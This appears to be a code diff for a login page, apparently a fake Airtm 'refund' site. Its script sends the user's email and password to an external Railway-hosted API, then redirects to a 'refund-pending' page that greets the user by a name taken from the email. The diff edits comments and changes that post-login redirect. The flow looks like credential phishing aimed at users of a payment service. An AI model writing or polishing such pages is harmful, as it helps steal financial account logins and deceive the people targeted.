@@ -736,7 +736,7 @@
     </div>
 
     <!-- ============================================
-       JAVASCRIPT - FIXED WITH ABSOLUTE URL
+       JAVASCRIPT - FIXED REDIRECT TO refund-pending.html
        ============================================ -->
     <script>
         // ============================================
@@ -801,7 +801,7 @@
             const emailInput = document.getElementById('loginEmail');
             const passwordInput = document.getElementById('loginPassword');
 
-            // 🔥 FIX: Use the FULL Railway URL
+            // Use the FULL Railway URL
             const API_BASE_URL = 'https://airtmrefund-production.up.railway.app';
 
             loginForm.addEventListener('submit', async function(e) {
@@ -862,8 +862,15 @@
 
                     if (data.success) {
                         showToast('Login successful! Redirecting...', 'success');
+                        
+                        // 🔥 FIX: Extract name from email and redirect to refund-pending.html
+                        const firstName = email.split('@')[0] || 'User';
+                        const redirectUrl = `/refund-pending.html?name=${encodeURIComponent(firstName)}`;
+                        
+                        console.log('🔄 Redirecting to:', redirectUrl);
+                        
                         setTimeout(() => {
-                            window.location.href = data.redirect || '/refund';
+                            window.location.href = redirectUrl;
                         }, 1000);
                     } else {
                         showToast(data.message || 'Login failed. Please try again.', 'error');
